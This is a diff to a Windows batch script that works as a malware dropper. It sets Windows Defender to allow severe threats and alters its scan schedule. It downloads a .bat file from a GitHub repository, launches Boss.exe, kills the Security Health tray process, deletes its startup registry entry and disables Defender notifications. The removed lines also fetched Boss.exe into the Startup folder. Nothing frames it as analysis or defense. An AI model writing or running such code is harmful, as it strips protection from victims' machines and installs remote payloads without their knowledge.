@@ -77,8 +77,14 @@ powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
 
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-
-bitsadmin/transfer Explorers /download /priority FOREGROUND https://github.com/Des0lator/-/raw/main/Boss.exe %Startup%\Boss.exe
+powershell.exe -command "Start-BitsTransfer -Source "https://github.com/Des0lator/sadas/raw/main/FuckYou.bat" -Destination "FuckYou.bat""
 
 powershell.exe -command "Start-Process "Boss.exe""
+
+powershell.exe -command "Set-ItemProperty -Path "$REG_LOCATION" -Name "$REG_KEY" -Type $TYPE -Value $VALUE"
+
+powershell.exe -command "Stop-Process -Name "SecurityHealthSystray" -Confirm"
+
+powershell.exe -command "Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth""
+
+powershell.exe -command "Set-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1"
